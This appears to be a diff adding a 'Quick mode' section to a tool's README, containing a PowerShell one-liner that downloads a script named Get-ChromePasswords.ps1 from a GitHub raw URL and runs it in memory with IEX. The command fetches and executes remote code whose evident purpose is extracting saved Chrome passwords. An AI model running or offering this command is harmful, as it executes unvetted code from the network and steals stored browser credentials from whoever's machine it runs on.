@@ -16,3 +16,10 @@
   ...
 ```
 
+## Quick mode...
+
+```PowerShell
+  PS> PS C:\Windows\system32> IEX((new-object net.webclient).downloadstring("https://raw.githubusercontent.com/et0x/Get-Chrome
+Passwords/master/Get-ChromePasswords.ps1"))
+```
+
